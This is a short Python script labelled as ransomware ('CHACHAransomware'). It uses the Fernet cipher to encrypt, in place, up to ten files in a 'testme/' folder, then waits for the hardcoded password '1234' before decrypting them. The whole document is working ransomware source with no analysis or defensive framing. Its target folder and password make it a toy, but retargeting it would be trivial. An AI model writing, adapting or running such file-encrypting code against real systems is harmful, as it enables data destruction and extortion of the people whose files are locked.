#CHACHAransomware
import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
target_dir = "testme/" 
file_list = os.listdir(target_dir)
print(file_list)

for num in range(0,10):
    try:
        target_file = target_dir+file_list[num]
    
        print(target_file)
        f = open(target_file)
        txt = f.read()
        byte = txt.encode()
        f.close()

        fw = open(target_file,'w')
        encrypted_text = cipher.encrypt(byte)
        notbyte = encrypted_text.decode()
        fw.write(notbyte)
        fw.close()
    except IndexError:
        break

print("encrypted")

while True:
    password = str(input("Enter the password: "))
    if password == "1234":
        break
    else:
        print("wrong")
for num in range(0,10):
    try:
        target_file = target_dir+file_list[num]
        f = open(target_file)
        print(target_file)
        encrypted_text = f.read().encode()
        f.close()
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = decrypted_text.decode()
        print(decrypted_text)
        afw = open(target_file,'w')
        afw.write(decrypted_text)
        afw.close()
    except IndexError:
        break
os.system('pause')
